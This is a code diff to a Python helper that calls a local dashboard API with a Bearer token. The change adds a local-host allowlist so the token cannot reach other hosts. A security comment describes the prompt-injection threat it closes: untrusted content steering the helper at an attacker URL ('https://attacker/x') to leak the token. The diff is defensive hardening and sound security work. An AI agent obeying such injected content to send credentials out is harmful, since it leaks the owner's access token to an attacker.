@@ -21,11 +21,24 @@ Prints the response body to stdout; exits non-zero on HTTP >= 400 (body still pr
 """
 import json
 import sys
+import urllib.parse
 import urllib.request
 import urllib.error
 
 BASE = "http://localhost:3420"
 TOKEN_PATH = "/home/domin/marveen/store/.dashboard-token"
+# The only hosts the Bearer token is ever allowed to reach.
+_LOCAL_HOSTS = {"localhost:3420", "127.0.0.1:3420", "localhost", "127.0.0.1"}
+
+
+def _is_local(path):
+    """True for a bare (relative) path or an absolute URL pointing at the local
+    dashboard only. Anything pointing elsewhere is rejected so the token can never
+    be exfiltrated to an attacker-controlled host."""
+    if not path.startswith(("http://", "https://")):
+        return True
+    host = urllib.parse.urlparse(path).netloc.lower()
+    return host in _LOCAL_HOSTS
 
 
 def main(argv):
@@ -36,14 +49,28 @@ def main(argv):
     path = argv[2]
     body = None
     if method in ("POST", "PUT", "PATCH", "DELETE"):
+        # For write verbs the body is argv[3], or stdin ("-"/omitted). In an agent
+        # context stdin is EOF-immediate; only an interactive tty would block here.
         raw = argv[3] if len(argv) > 3 and argv[3] != "-" else sys.stdin.read()
         raw = (raw or "").strip()
         if raw:
             json.loads(raw)  # validate early -> clearer error than a 400
             body = raw.encode()
 
+    # SECURITY: the token must NEVER leave the local dashboard. We only ever attach
+    # it to localhost:3420. A bare path is resolved against BASE; an absolute URL is
+    # rejected unless its host is exactly the local dashboard. This closes the
+    # prompt-injection token-exfil gadget where untrusted content could steer this
+    # helper at `GET https://attacker/x` and leak the Bearer header (PR#624 review).
+    if _is_local(path):
+        url = path if path.startswith("http") else BASE + path
+    else:
+        sys.stderr.write(
+            "REFUSED: noa-api.py only calls the local dashboard "
+            f"({BASE}); refusing absolute URL to a non-local host: {path}\n")
+        return 2
+
     tok = open(TOKEN_PATH).read().strip()
-    url = path if path.startswith("http") else BASE + path
     headers = {"Authorization": f"Bearer {tok}"}
     if body is not None:
         headers["Content-Type"] = "application/json"
